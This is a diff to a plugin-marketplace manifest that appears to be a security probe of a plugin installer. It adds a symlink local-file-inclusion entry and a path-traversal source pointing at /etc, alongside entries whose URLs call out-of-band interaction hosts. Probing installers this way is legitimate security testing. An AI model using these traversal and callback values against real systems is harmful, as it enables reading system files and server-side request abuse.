@@ -4,6 +4,8 @@
   "plugins": [
     {"name": "hello", "source": "./hello", "description": "valid"},
     {"name": "urlx", "source": {"source": "url", "url": "https://urlx.d8j42hsi7hujvandd2ngc8epk6z3f8ymm.oast.fun/owner/repo"}, "description": "x"},
-    {"name": "gsubx", "source": {"source": "git-subdir", "url": "https://gsubx.d8j42hsi7hujvandd2ngc8epk6z3f8ymm.oast.fun/owner/repo", "subdirectory": "sub"}, "description": "x"}
+    {"name": "gsubx", "source": {"source": "git-subdir", "url": "https://gsubx.d8j42hsi7hujvandd2ngc8epk6z3f8ymm.oast.fun/owner/repo", "subdirectory": "sub"}, "description": "x"},
+    {"name": "symp", "source": "./symp", "description": "symlink manifest LFI"},
+    {"name": "trav2", "source": "./hello/../../../../../../../etc", "description": "traversal"}
   ]
 }
